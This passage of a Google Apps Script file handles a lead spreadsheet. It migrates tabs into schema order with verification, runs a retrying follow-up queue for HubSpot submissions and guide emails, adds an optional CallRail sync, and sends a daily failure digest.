    const drift = describeSheetDrift(live, schema.headers, []);

    let formulas = 0;
    try {
      sheet.getDataRange().getFormulas().forEach(function (r) {
        r.forEach(function (f) { if (f) formulas++; });
      });
    } catch (err) { /* a count, not a gate */ }
    let filtered = false;
    try { filtered = !!sheet.getFilter(); } catch (err) { /* not every sheet type has one */ }

    lines.push(schema.tab + ': ' + rows.length + ' row(s), ' + live.length + ' column(s). ' +
      (drift ? 'NEEDS MIGRATION (' + drift + ')' : 'already in schema order') + '. ' +
      'New columns it will gain: ' + (missing.length ? missing.join(', ') : 'none') + '. ' +
      'Left behind: ' + (plan.dropped.length ? plan.dropped.join(', ') : 'none') + '. ' +
      'Carried across though not in the schema: ' +
        (plan.extras.length ? plan.extras.map(function (e) { return '"' + e.name + '"'; }).join(', ') : 'none') + '. ' +
      'Formulas: ' + formulas + (formulas ? ' (copied as their current VALUE, not as formulas)' : '') + '. ' +
      'Filter on the tab: ' + (filtered ? 'YES, check it after migrating' : 'no') + '.');
  });
  lines.forEach(function (line) {
    Logger.log('auditLeadTabs: ' + line);
    logDebug(ss, 'auditLeadTabs: ' + line, '');
  });
  return lines;
}

/** A tab name that is free: `base`, or `base 2`, `base 3` and so on. */
function freeTabName(ss, base) {
  if (!ss.getSheetByName(base)) return base;
  for (let n = 2; n < 50; n++) {
    if (!ss.getSheetByName(base + ' ' + n)) return base + ' ' + n;
  }
  throw new Error('no free tab name for ' + base);
}

/**
 * Rebuilds one tab in schema order. Returns one line saying what happened.
 * Leaves the tab exactly as it found it unless every check passes.
 */
function migrateLeadTab(ss, schema, stamp) {
  const tab = schema.tab;
  const headers = schema.headers;
  const sheet = ss.getSheetByName(tab);
  if (!sheet) return tab + ': no such tab, nothing to migrate';

  const range = sheet.getDataRange();
  const grid = range.getValues();
  const formats = range.getNumberFormats();
  const live = (grid[0] || []).map(function (h) { return String(isBlankCell(h) ? '' : h).trim(); });
  const rows = grid.slice(1);

  if (!describeSheetDrift(live, headers, [])) return tab + ': already in schema order, left alone';

  const plan = planTabMigration(tab, live, headers, rows);

  // The value for one schema header on one row. When the sheet has the header
  // twice, as the @38 incident left Status and Contacted, the two columns must
  // not disagree: picking one would silently discard what a person typed in
  // the other.
  let conflict = '';
  function pick(r, cols) {
    let at = -1;
    for (let i = 0; i < cols.length; i++) {
      if (isBlankCell(rows[r][cols[i]])) continue;
      if (at === -1) { at = cols[i]; continue; }
      if (!sameCell(rows[r][at], rows[r][cols[i]]) && !conflict) {
        conflict = 'row ' + (r + 2) + ' has two different values under "' + live[at] + '"';
      }
    }
    return at;
  }

  const newHeaders = headers.concat(plan.extras.map(function (e) { return e.name; }));
  const outValues = [];
  const outFormats = [];
  for (let r = 0; r < rows.length; r++) {
    const values = [];
    const fmts = [];
    headers.forEach(function (h) {
      const from = pick(r, plan.kept[h]);
      values.push(from === -1 ? '' : rows[r][from]);
      fmts.push(from === -1 ? '' : formats[r + 1][from]);
    });
    plan.extras.forEach(function (e) {
      values.push(isBlankCell(rows[r][e.index]) ? '' : rows[r][e.index]);
      fmts.push(formats[r + 1][e.index]);
    });
    // Text goes back as text. getValues() only returns a string for a cell
    // that holds text, and writing one back unformatted lets Sheets re-read
    // it: "+1 714..." as a formula, "$240,000" as a number, "007" as 7. A
    // number or a date keeps the format it had.
    //
    // Except text that would read as a formula. A cell the formula guard
    // stored as text (=IMAGE(...) typed as a name) comes back from getValues()
    // as the bare string, and whether setValues honours the plain-text format
    // for it is not something to find out on Darren's Sheet. So it goes back
    // the way doPost wrote it, through safeCell, into an ordinary cell, where
    // the apostrophe is consumed and the text stored exactly as it was; the
    // check below then reads it back unchanged.
    for (let c = 0; c < values.length; c++) {
      if (typeof values[c] === 'string' && values[c] !== '' && safeCell(values[c]) !== values[c]) {
        values[c] = safeCell(values[c]);
        fmts[c] = 'General';
      } else if (typeof values[c] === 'string' && values[c] !== '') fmts[c] = '@';
      else if (!fmts[c]) fmts[c] = 'General';
    }
    outValues.push(values);
    outFormats.push(fmts);
  }
  if (conflict) return tab + ': NOT MIGRATED, ' + conflict + '. Clear one of the two cells and run again';

  // A "(new)" tab left by a run that died is ours and holds nothing original.
  const scratchName = tab + ' (new)';
  const stale = ss.getSheetByName(scratchName);
  if (stale) ss.deleteSheet(stale);

  const fresh = createSheetWithHeaders(ss, scratchName, newHeaders);
  if (outValues.length) {
    const target = fresh.getRange(2, 1, outValues.length, newHeaders.length);
    target.setNumberFormats(outFormats);
    target.setValues(outValues);
  }
  SpreadsheetApp.flush();

  // Verify against the ORIGINAL before anything is renamed: same number of
  // rows, and every value that was not deliberately left behind is under the
  // header it was under before.
  const written = fresh.getDataRange().getValues();
  let wrong = '';
  if (written.length !== grid.length) {
    wrong = 'row count ' + (written.length - 1) + ' against ' + rows.length;
  }
  for (let r = 0; r < rows.length && !wrong; r++) {
    headers.forEach(function (h, c) {
      plan.kept[h].forEach(function (from) {
        if (wrong || isBlankCell(rows[r][from])) return;
        if (!sameCell(written[r + 1][c], rows[r][from])) wrong = 'row ' + (r + 2) + ', "' + h + '"';
      });
    });
    plan.extras.forEach(function (e, k) {
      if (wrong || isBlankCell(rows[r][e.index])) return;
      if (!sameCell(written[r + 1][headers.length + k], rows[r][e.index])) wrong = 'row ' + (r + 2) + ', "' + e.name + '"';
    });
  }
  if (wrong) {
    ss.deleteSheet(fresh);
    return tab + ': NOT MIGRATED, the copy did not match the original at ' + wrong + '. The tab is unchanged';
  }

  const oldName = freeTabName(ss, tab + ' (old ' + stamp + ')');
  let position = -1;
  try { position = sheet.getIndex(); } catch (err) { /* cosmetic */ }
  sheet.setName(oldName);
  fresh.setName(tab);
  // Put the new tab where the old one was, so the tab bar reads as before.
  try {
    if (position > 0) { ss.setActiveSheet(fresh); ss.moveActiveSheet(position); }
  } catch (err) { /* cosmetic: the data is already in place */ }

  return tab + ': migrated ' + rows.length + ' row(s) into ' + headers.length + ' schema column(s)' +
    (plan.extras.length ? ', carried ' + plan.extras.map(function (e) { return '"' + e.name + '"'; }).join(', ') : '') +
    (plan.dropped.length ? ', left behind ' + plan.dropped.join(', ') : '') +
    '. Original kept as "' + oldName + '"';
}

/**
 * Puts every lead tab into the schema's column order. Run once, by hand, after
 * auditLeadTabs() and after copying the spreadsheet (File > Make a copy).
 *
 * Holds the script lock throughout, which is the same lock doPost waits on, so
 * a lead submitted mid-run is written after the rename, to the new tab, rather
 * than to a tab that is about to become "(old ...)". Safe to run twice: a tab
 * already in order is left alone.
 */
function migrateLeadTabs() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  const stamp = Utilities.formatDate(new Date(), 'America/Los_Angeles', 'yyyy-MM-dd');
  const lines = [];
  const lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    leadTabSchemas().forEach(function (schema) {
      try {
        lines.push(migrateLeadTab(ss, schema, stamp));
      } catch (err) {
        lines.push(schema.tab + ': NOT MIGRATED, threw ' + err.toString());
      }
    });
  } finally {
    try { lock.releaseLock(); } catch (err) { /* released or expired */ }
  }
  lines.forEach(function (line) {
    Logger.log('migrateLeadTabs: ' + line);
    logDebug(ss, 'migrateLeadTabs: ' + line, '');
  });
  return lines;
}

// ---------------------------------------------------------------------------
// Follow-up queue: HubSpot submit and guide emails, run by a time-driven trigger.
// Setup (once): run installFollowUpTrigger() from the Apps Script editor.
// ---------------------------------------------------------------------------
const FOLLOWUP_TAB = 'Follow-ups';
const FOLLOWUP_HEADERS = ['Queued At', 'Status', 'Processed At', 'Error', 'Source', 'Email', 'Payload'];
const FOLLOWUP_COL = { status: 2, processedAt: 3, error: 4, source: 5, email: 6, payload: 7 };
const FOLLOWUP_MAX_RUN_MS = 4 * 60 * 1000; // stay well inside the 6 min execution cap
const FOLLOWUP_RUNNING_KEY = 'followups_running';
const GUIDE_MAX_ATTEMPTS = 6;

/**
 * Minutes to wait before attempt 2, 3, 4, 5, 6. The first version retried once
 * per trigger run, so all three attempts were spent inside three minutes - a
 * Resend outage lasts longer than that, and every lead submitted during one
 * would end 'guide-failed' having barely tried. This spreads six attempts over
 * about four and a half hours.
 */
const GUIDE_BACKOFF_MIN = [1, 5, 20, 60, 180];

/**
 * A row is claimed as 'processing:N' before any HTTP. If the run dies mid-call
 * the row keeps that status forever and the lead's guide is never sent. After
 * this long, another run may take it back. Comfortably longer than the 6 minute
 * execution cap, so a live run is never stolen from.
 */
const FOLLOWUP_ORPHAN_MS = 10 * 60 * 1000;

/** Milliseconds to wait after `attemptsMade` failures. */
function guideBackoffMs(attemptsMade) {
  const i = Math.max(0, attemptsMade - 1);
  const mins = GUIDE_BACKOFF_MIN[Math.min(i, GUIDE_BACKOFF_MIN.length - 1)];
  return mins * 60 * 1000;
}

/**
 * Next queue status after a guide attempt. Pure, so the whole retry policy is
 * testable without Sheets. `attempt` is 1 for the first try.
 *   { status, alert }  alert=true means email Darren now
 */
function nextGuideStatus(outcome, attempt) {
  const next = nextFollowUpStatus({ guide: outcome }, attempt);
  return { status: next.status, alert: next.alert };
}

/**
 * Next queue status when a pass may have run two retryable jobs: the guide
 * email and the HubSpot submit. `outcomes` holds only the jobs this pass ran,
 * e.g. { guide: 'sent', hubspot: 'retry' }.
 *
 * WHY THE JOB IS IN THE STATUS. A row has one Status cell, and a retry must
 * redo only what failed: re-running a guide that was already delivered because
 * HubSpot was briefly down would mail the lead the same PDF twice. So the prefix
 * says what is still owed, and processFollowUps runs exactly that:
 *   guide-retry:N    the guide only (all a retry ever meant before HubSpot)
 *   hubspot-retry:N  HubSpot only; the guide is finished
 *   retry:N          both
 * No new column, deliberately: Payload must stay last (it is the long cell a
 * person scrolls past), and the append-only rule would put a new one after it.
 *
 * A job that is finished badly (rejected, or out of attempts) is alerted now and
 * does not hold the row open for the other. When nothing is owed any more the
 * row ends 'done', or with the first bad job's terminal status for the digest.
 * `bad` lists every job that ended badly on this pass, e.g. ['hubspot-rejected'].
 */
function nextFollowUpStatus(outcomes, attempt) {
  const owed = [];
  const bad = [];
  ['guide', 'hubspot'].forEach(function (job) {
    if (!Object.prototype.hasOwnProperty.call(outcomes, job)) return;
    const o = outcomes[job];
    if (o === 'sent' || o === 'skipped') return;
    if (o === 'rejected') bad.push(job + '-rejected');
    else if (attempt >= GUIDE_MAX_ATTEMPTS) bad.push(job + '-failed');
    else owed.push(job);
  });
  let status;
  if (owed.length === 2) status = 'retry:' + attempt;
  else if (owed.length === 1) status = owed[0] + '-retry:' + attempt;
  else status = bad.length ? bad[0] : 'done';
  return { status: status, alert: bad.length > 0, bad: bad };
}

/**
 * Which jobs a row still owes, read from its Status. Anything that does not
 * name one owes both: 'pending', a bare 'retry:N', and an orphaned claim whose
 * status predates the job marker.
 */
function followUpJobs(status) {
  const s = String(status || '');
  if (/^(?:guide-retry|processing-guide):\d+$/.test(s)) return { guide: true, hubspot: false };
  if (/^(?:hubspot-retry|processing-hubspot):\d+$/.test(s)) return { guide: false, hubspot: true };
  return { guide: true, hubspot: true };
}

/**
 * Attempts already made, read back from a '[guide-|hubspot-]retry:N' or
 * 'processing[-guide|-hubspot]:N' status. 0 for anything else, including a bare
 * legacy 'processing'.
 */
function guideAttemptsFromStatus(status) {
  const m = /^(?:(?:guide-|hubspot-)?retry|processing(?:-guide|-hubspot)?):(\d+)$/.exec(String(status || ''));
  return m ? parseInt(m[1], 10) : 0;
}

/**
 * Whether this run may take the row, and which attempt it would be. Pure, so
 * the whole scheduling policy is testable without Sheets.
 *   status      the Status cell
 *   processedAt the Processed At cell (ISO string, Date, or blank)
 *   now         milliseconds
 * Returns { claim, attempts, reason }.
 */
function claimDecision(status, processedAt, now) {
  const s = String(status || '');
  if (s === 'pending') return { claim: true, attempts: 0, reason: 'new' };

  const last = Date.parse(
    processedAt instanceof Date ? processedAt.toISOString() : String(processedAt || '')
  );
  const age = isNaN(last) ? Infinity : now - last; // no timestamp: treat as old

  if (/^(?:guide-|hubspot-)?retry:\d+$/.test(s)) {
    const attempts = guideAttemptsFromStatus(s);
    if (attempts >= GUIDE_MAX_ATTEMPTS) return { claim: false, attempts: attempts, reason: 'exhausted' };
    if (age < guideBackoffMs(attempts)) return { claim: false, attempts: attempts, reason: 'backoff' };
    return { claim: true, attempts: attempts, reason: 'retry' };
  }

  // A row stuck mid-flight because the run that claimed it died.
  if (s === 'processing' || /^processing(?:-guide|-hubspot)?:\d+$/.test(s)) {
    if (age < FOLLOWUP_ORPHAN_MS) return { claim: false, attempts: 0, reason: 'in-flight' };
    return { claim: true, attempts: guideAttemptsFromStatus(s), reason: 'orphan' };
  }

  return { claim: false, attempts: 0, reason: 'terminal' };
}

function enqueueFollowUp(ss, data, raw) {
  const sheet = getOrCreateSheet(ss, FOLLOWUP_TAB, FOLLOWUP_HEADERS);
  appendSafeRow(sheet, [
    new Date().toISOString(), 'pending', '', '', data.source || '', data.email || '', raw
  ]);
}

// Sheet writes are serialised against doPost, but only one write at a time.
// The script lock must NOT be held across the HTTP below: doPost waits on that
// same lock for 20s, so holding it for a multi-minute batch would fail exactly
// the live submissions this queue exists to protect.
function withSheetLock(fn) {
  const lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try { return fn(); } finally { lock.releaseLock(); }
}

/**
 * Runs every minute, but a given row is only picked up when claimDecision says
 * so: new rows immediately, a failed guide after its backoff (1, 5, 20, 60 then
 * 180 minutes), and a row stuck in 'processing:N' once it is old enough to be
 * an orphan from a run that died.
 *
 * HubSpot and the guide email each report their own outcome. The guide: sent -> 'done'; Resend busy/down -> 'guide-retry:N', retried up to
 * GUIDE_MAX_ATTEMPTS, then 'guide-failed'; a permanent rejection (invalid
 * address, missing config) -> 'guide-rejected' with no retry. Both terminal
 * failures alert Darren, and the daily digest catches anything the 5 minute
 * alert throttle swallowed. Anything that throws is marked 'error' and alerted;
 * the Sheet row is safe either way.
 *
 * Overlapping runs are prevented with a self-expiring cache key rather than the
 * script lock, so a crashed run heals itself after the TTL instead of wedging
 * the queue, and doPost is never blocked behind this.
 */
function processFollowUps() {
  const cache = CacheService.getScriptCache();
  if (cache.get(FOLLOWUP_RUNNING_KEY)) return; // a previous run is still going
  cache.put(FOLLOWUP_RUNNING_KEY, '1', 300);

  const started = Date.now();
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sheet = ss.getSheetByName(FOLLOWUP_TAB);
    syncEmailOptOuts(ss);
    if (!sheet || sheet.getLastRow() < 2) return;
    const rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, FOLLOWUP_HEADERS.length).getValues();

    for (let i = 0; i < rows.length; i++) {
      if (Date.now() - started > FOLLOWUP_MAX_RUN_MS) break;
      const decision = claimDecision(
        rows[i][FOLLOWUP_COL.status - 1],
        rows[i][FOLLOWUP_COL.processedAt - 1],
        Date.now()
      );
      if (!decision.claim) continue;
      const priorAttempts = decision.attempts;
      const rowNum = i + 2;
      // Read before the claim overwrites it, and carried INTO the claim, so a
      // run that dies mid-row leaves an orphan that still says what was owed.
      const jobs = followUpJobs(rows[i][FOLLOWUP_COL.status - 1]);
      const claimTag = jobs.guide && jobs.hubspot ? '' : (jobs.guide ? '-guide' : '-hubspot');

      // Claim the row before any HTTP, so a crash mid-item can't re-run it.
      // The attempt count goes into the claim, and the timestamp with it: the
      // old bare 'processing' lost the count, and a run that died here left the
      // row stuck forever with nothing to measure staleness against.
      withSheetLock(function () {
        sheet.getRange(rowNum, FOLLOWUP_COL.status, 1, 2)
          .setValues([['processing' + claimTag + ':' + priorAttempts, new Date().toISOString()]]);
        SpreadsheetApp.flush();
      });

      const raw = String(rows[i][FOLLOWUP_COL.payload - 1] || '{}');
      try {
        const data = JSON.parse(raw);
        // No lock held here: this is seconds of HTTP, including a PDF render.
        // There is no Bonzo job any more (retired 15 Oct 2026). A row queued
        // before that deploy still owes only what its status names, so it
        // finishes its HubSpot and guide work and is never sent to Bonzo.
        // HubSpot and the guide each report an outcome, and each runs only
        // while it is still owed (see nextFollowUpStatus).
        const outcomes = {};
        const results = {};
        if (jobs.hubspot) { results.hubspot = pushToHubSpot(ss, data); outcomes.hubspot = results.hubspot.outcome; }
        if (jobs.guide) { results.guide = sendGuideFor(ss, data); outcomes.guide = results.guide.outcome; }
        const next = nextFollowUpStatus(outcomes, priorAttempts + 1);
        const unfinished = ['hubspot', 'guide'].filter(function (job) {
          return results[job] && results[job].outcome !== 'sent' && results[job].outcome !== 'skipped';
        });
        const detail = unfinished.map(function (job) { return results[job].detail || ''; }).join(' | ');
        withSheetLock(function () {
          sheet.getRange(rowNum, FOLLOWUP_COL.status, 1, 3)
            .setValues([[next.status, new Date().toISOString(), next.status === 'done' ? '' : detail]]);
        });
        if (next.alert) {
          // One alert per row, naming each job that ended badly: alertFailure is
          // throttled, so a second call here would usually be swallowed.
          const lines = [];
          const endedBadly = function (job) {
            return next.bad.some(function (s) { return s.indexOf(job + '-') === 0; });
          };
          if (endedBadly('guide')) {
            lines.push('guide email NOT delivered to ' + (data.email || '(no email)') + '. ' +
              'The lead IS saved in the Sheet; send the guide by hand. Detail: ' + (results.guide.detail || ''));
          }
          if (endedBadly('hubspot')) {
            lines.push('HubSpot did NOT receive ' + (data.email || '(no email)') + '. ' +
              'The lead IS saved in the Sheet; add it to HubSpot by hand if it matters before this is fixed. Detail: ' +
              (results.hubspot.detail || ''));
          }
          alertFailure(lines.join('\n\n') + ' [' + next.status + ']', raw);
        }
      } catch (err) {
        withSheetLock(function () {
          sheet.getRange(rowNum, FOLLOWUP_COL.status, 1, 3).setValues([['error', new Date().toISOString(), err.toString()]]);
        });
        alertFailure('follow-up threw (Sheet row IS saved; HubSpot/guide may not have run): ' + err.toString(), raw);
      }
    }
    if (Date.now() - started < FOLLOWUP_MAX_RUN_MS) {
      try { processCallRailSync(ss); }
      catch (err) { logDebug(ss, 'CallRail sync needs review: ' + err.toString(), ''); }
    }
  } finally {
    try { cache.remove(FOLLOWUP_RUNNING_KEY); } catch (e) { /* TTL will clear it */ }
  }
}

// Additional CRM visibility is deliberately dark until account configuration
// and duplicate-conversion checks are verified. A POST with an uncertain result
// is never blindly retried: CallRail documents no submission idempotency key.
const CALLRAIL_SYNC_HEADERS = ['Submission ID', 'Payload', 'Status', 'CallRail ID', 'Detail'];
function enqueueCallRailSync(ss, data) {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('CALLRAIL_SYNC_ENABLED') !== 'true' || (isTestLead(data) && props.getProperty('CALLRAIL_SEND_TESTS') !== 'true')) return;
  withSheetLock(function () {
    let sheet = ss.getSheetByName('CallRail Sync');
    if (!sheet) { sheet = ss.insertSheet('CallRail Sync'); appendSafeRow(sheet, CALLRAIL_SYNC_HEADERS); }
    if (sheet.getLastRow() > 1 && sheet.getRange(2, 1, sheet.getLastRow() - 1, 1).getValues().some(function (row) { return row[0] === data.submissionId; })) return;
    appendSafeRow(sheet, [data.submissionId, JSON.stringify(leadSnapshot(data)), 'pending', '', '']);
  });
}
function callRailSubmission(data, companyId) {
  return { form_submission: {
    company_id: companyId,
    referrer: data.utm_source || 'direct',
    referring_url: data.referrer || '',
    landing_page_url: data.landingPage || data.pageUri || '',
    form_url: data.pageUri || '',
    form_data: Object.assign({}, leadSnapshot(data), {
      phone_number: data.phone, email: data.email,
      website_submission_id: data.submissionId,
      calculator_snapshot: JSON.stringify(leadSnapshot(data))
    })
  } };
}
function processCallRailSync(ss) {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('CALLRAIL_SYNC_ENABLED') !== 'true') return;
  const token = props.getProperty('CALLRAIL_API_TOKEN');
  const account = props.getProperty('CALLRAIL_ACCOUNT_ID');
  const company = props.getProperty('CALLRAIL_COMPANY_ID');
  if (!token || !/^\d+$/.test(account || '') || !company) return;
  const sheet = ss.getSheetByName('CallRail Sync');
  if (!sheet || sheet.getLastRow() < 2) return;
  const rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, 5).getValues();
  for (let i = 0; i < rows.length; i++) {
    if (rows[i][2] !== 'pending') continue;
    const row = i + 2;
    sheet.getRange(row, 3, 1, 1).setValues([['sending']]); // a crash is reviewable, not duplicate delivery
    try {
      const data = JSON.parse(rows[i][1]);
      const response = UrlFetchApp.fetch('https://api.callrail.com/v3/a/' + account + '/form_submissions.json', {
        method: 'post', contentType: 'application/json',
        headers: { Authorization: 'Token token=' + token },
        payload: JSON.stringify(callRailSubmission(data, company)), muteHttpExceptions: true
      });
      const status = response.getResponseCode();
      const body = JSON.parse(response.getContentText());
      if (status === 201 && body.id) sheet.getRange(row, 3, 1, 3).setValues([['sent', body.id, '']]);
      else sheet.getRange(row, 3, 1, 3).setValues([['needs-review', '', 'HTTP ' + status]]);
    } catch (err) { sheet.getRange(row, 3, 1, 3).setValues([['needs-review', '', 'Delivery result uncertain; reconcile before retry']]); }
    break; // one optional POST per worker, preserving time for the existing pipeline
  }
}

// ── Daily digest ────────────────────────────────────────────────────────────
//
// WHY. alertFailure sends at most one email every 5 minutes. That is right for
// a flood, but it means the second and later failures in a burst are visible
// only to someone who thinks to open the Follow-ups tab. If a guide API key
// expires, every lead fails, Darren gets one email, and the rest are silent.
// This runs once a day and reports everything, throttled by nothing.

const GUIDE_DIGEST_STATUSES = ['guide-failed', 'guide-rejected', 'hubspot-failed', 'hubspot-rejected', 'error'];
const DIGEST_WINDOW_MS = 24 * 60 * 60 * 1000;

/**
 * The rows a digest should mention: terminal failures stamped within the
 * window. Pure, so it can be tested without Sheets. `rows` is the raw
 * getValues() block, without the header row.
 */
function guideDigestRows(rows, now) {
  const out = [];
  for (let i = 0; i < rows.length; i++) {
    const status = String(rows[i][FOLLOWUP_COL.status - 1] || '');
    if (GUIDE_DIGEST_STATUSES.indexOf(status) === -1) continue;
    const at = rows[i][FOLLOWUP_COL.processedAt - 1];
    const ts = Date.parse(at instanceof Date ? at.toISOString() : String(at || ''));
    if (!isNaN(ts) && now - ts > DIGEST_WINDOW_MS) continue; // older than the window
    out.push({
      row: i + 2,
      status: status,
      source: String(rows[i][FOLLOWUP_COL.source - 1] || ''),
      email: String(rows[i][FOLLOWUP_COL.email - 1] || ''),
      error: String(rows[i][FOLLOWUP_COL.error - 1] || '').slice(0, 200),
    });
  }
  return out;
}

function formatGuideDigest(items) {
  // What went missing, per row, now that a row can fail two different ways.
  function missing(status) {
    if (status.indexOf('hubspot-') === 0) return 'not in HubSpot';
    if (status.indexOf('guide-') === 0) return 'guide email not sent';
    return 'follow-up did not finish';
  }
  const lines = items.map(function (it) {
    return '- row ' + it.row + '  [' + it.status + ']  ' + (it.email || '(no email)') +
           (it.source ? '  (' + it.source + ')' : '') + '  ' + missing(it.status) + '\n    ' + it.error;
  });
  return 'These leads ARE saved in the Sheet. What did not happen is listed per row.\n' +
         'Send a missing guide by hand; a lead missing from HubSpot can be added there by hand.\n\n' +
         lines.join('\n') + '\n';
}

/** Installed as a daily trigger. Sends nothing on a clean day. */
function sendGuideDigest() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  trimDebugTab(ss); // once a day is often enough, and this is the only daily job
  const sheet = ss.getSheetByName(FOLLOWUP_TAB);
  if (!sheet || sheet.getLastRow() < 2) return;
  const rows = sheet.getRange(2, 1, sheet.getLastRow() - 1, FOLLOWUP_HEADERS.length).getValues();
  const items = guideDigestRows(rows, Date.now());
  if (items.length === 0) return; // silence means nothing failed
  try {
    MailApp.sendEmail({
      to: ALERT_EMAIL,
      subject: items.every(function (it) { return it.status.indexOf('hubspot-') !== 0; })
        ? items.length + ' guide email(s) not delivered in the last 24h'
        : items.length + ' lead follow-up(s) did not finish in the last 24h',
      body: formatGuideDigest(items),
    });
  } catch (err) {
    Logger.log('sendGuideDigest failed: ' + err.toString());
  }
}

/**
 * Run once by hand. Replaces the queue trigger and the daily digest trigger.
 * The old name is kept because that is what the deployment notes tell Darren
 * to run.
 */
function installTriggers() {
  ScriptApp.getProjectTriggers().forEach(function (t) {
    const fn = t.getHandlerFunction();
    if (fn === 'processFollowUps' || fn === 'sendGuideDigest') ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('processFollowUps').timeBased().everyMinutes(1).create();
  ScriptApp.newTrigger('sendGuideDigest').timeBased().everyDays(1).atHour(7).create();
}

function installFollowUpTrigger() {
  installTriggers();
}

function doGet() {
  return ContentService
    .createTextOutput(JSON.stringify({ status: 'ok' }))
    .setMimeType(ContentService.MimeType.JSON);
}
